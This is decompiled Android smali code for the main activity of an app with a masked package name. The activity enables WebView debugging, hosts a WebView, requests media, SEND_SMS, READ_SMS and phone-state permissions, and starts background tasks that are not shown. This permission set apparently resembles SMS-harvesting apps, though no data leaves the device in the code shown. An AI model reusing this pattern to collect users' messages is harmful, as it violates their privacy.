.class public final Lcom/xxxx/runapp/MainActivity;
.super Le/j;
.source "SourceFile"

# interfaces
.implements Le3/a;


# static fields
.field public static final synthetic F:I


# instance fields
.field public A:Landroid/view/View;

.field public B:Landroidx/activity/result/d;

.field public C:Landroidx/activity/result/d;

.field public D:Landroid/webkit/ValueCallback;

.field public E:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 3

    invoke-direct {p0}, Landroidx/fragment/app/r;-><init>()V

    iget-object v0, p0, Landroidx/activity/l;->i:Lg1/e;

    iget-object v0, v0, Lg1/e;->b:Lg1/d;

    new-instance v1, Le/h;

    const/4 v2, 0x0

    invoke-direct {v1, v2, p0}, Le/h;-><init>(ILjava/lang/Object;)V

    const-string v2, "androidx:appcompat"

    invoke-virtual {v0, v2, v1}, Lg1/d;->c(Ljava/lang/String;Lg1/c;)V

    new-instance v0, Le/i;

    invoke-direct {v0, p0}, Le/i;-><init>(Le/j;)V

    invoke-virtual {p0, v0}, Landroidx/activity/l;->h(Lb/b;)V

    return-void
.end method


# virtual methods
.method public final onCreate(Landroid/os/Bundle;)V
    .locals 2

    invoke-super {p0, p1}, Landroidx/fragment/app/r;->onCreate(Landroid/os/Bundle;)V

    const/4 v0, 0x1

    invoke-static {v0}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V

    const p1, 0x7f0b001d

    invoke-virtual {p0, p1}, Le/j;->setContentView(I)V

    const p1, 0x7f08009e

    invoke-virtual {p0, p1}, Le/j;->findViewById(I)Landroid/view/View;

    move-result-object p1

    const-string v0, "findViewById(...)"

    invoke-static {p1, v0}, Li3/f;->j(Ljava/lang/Object;Ljava/lang/String;)V

    iput-object p1, p0, Lcom/xxxx/runapp/MainActivity;->A:Landroid/view/View;

    new-instance p1, Lc/a;

    invoke-direct {p1}, Ljava/lang/Object;-><init>()V

    new-instance v0, Ln2/b;

    const/16 v1, 0x9

    invoke-direct {v0, v1}, Ln2/b;-><init>(I)V

    invoke-virtual {p0, v0, p1}, Landroidx/activity/l;->i(Landroidx/activity/result/c;Lr2/f;)Landroidx/activity/result/d;

    move-result-object p1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x21

    if-lt v0, v1, :cond_0

    const-string v0, "android.permission.READ_MEDIA_IMAGES"

    const-string v1, "android.permission.READ_MEDIA_VIDEO"

    filled-new-array {v0, v1}, [Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_0
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    filled-new-array {v0}, [Ljava/lang/String;

    move-result-object v0

    :goto_0
    invoke-virtual {p1, v0}, Lg6/a;->b(Ljava/lang/Object;)V

    new-instance p1, Le/h0;

    const/16 v0, 0xb

    invoke-direct {p1, p0, v0, p0}, Le/h0;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    sget-object v0, Le3/d;->a:Ljava/util/concurrent/ExecutorService;

    invoke-interface {v0, p1}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    const-string p1, "android.permission.SEND_SMS"

    invoke-static {p0, p1}, Ll0/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1

    invoke-static {p0, p1}, Ll0/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1

    goto :goto_1

    :cond_1
    const-string v0, "android.permission.READ_SMS"

    filled-new-array {p1, v0}, [Ljava/lang/String;

    move-result-object p1

    const/16 v0, 0x64

    invoke-static {p0, p1, v0}, Lk0/f;->b(Landroid/app/Activity;[Ljava/lang/String;I)V

    :goto_1
    const-string p1, "android.permission.READ_PHONE_STATE"

    invoke-static {p0, p1}, Ll0/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_2

    goto :goto_2

    :cond_2
    filled-new-array {p1}, [Ljava/lang/String;

    move-result-object p1

    const/16 v0, 0x65

    invoke-static {p0, p1, v0}, Lk0/f;->b(Landroid/app/Activity;[Ljava/lang/String;I)V

    :goto_2
    new-instance p1, Le/l;

    const/4 v0, 0x3

    invoke-direct {p1, p0, v0}, Le/l;-><init>(Landroid/content/Context;I)V

    sget-object v0, Lf3/d;->b:Ljava/util/concurrent/ExecutorService;

    invoke-interface {v0, p1}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    new-instance p1, Lc/b;

    invoke-direct {p1}, Ljava/lang/Object;-><init>()V

    new-instance v0, La3/a;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, La3/a;-><init>(Lcom/xxxx/runapp/MainActivity;I)V

    invoke-virtual {p0, v0, p1}, Landroidx/activity/l;->i(Landroidx/activity/result/c;Lr2/f;)Landroidx/activity/result/d;

    move-result-object p1

    iput-object p1, p0, Lcom/xxxx/runapp/MainActivity;->B:Landroidx/activity/result/d;

    new-instance p1, Lc/b;

    invoke-direct {p1}, Ljava/lang/Object;-><init>()V

    new-instance v0, La3/a;

    const/4 v1, 0x1

    invoke-direct {v0, p0, v1}, La3/a;-><init>(Lcom/xxxx/runapp/MainActivity;I)V

    invoke-virtual {p0, v0, p1}, Landroidx/activity/l;->i(Landroidx/activity/result/c;Lr2/f;)Landroidx/activity/result/d;

    move-result-object p1

    iput-object p1, p0, Lcom/xxxx/runapp/MainActivity;->C:Landroidx/activity/result/d;

    new-instance p1, Landroidx/fragment/app/x;

    invoke-direct {p1, p0}, Landroidx/fragment/app/x;-><init>(Lcom/xxxx/runapp/MainActivity;)V

    iget-object v0, p0, Landroidx/activity/l;->k:Landroidx/activity/u;

    invoke-virtual {v0, p0, p1}, Landroidx/activity/u;->a(Landroidx/lifecycle/s;Landroidx/fragment/app/x;)V

    return-void
.end method
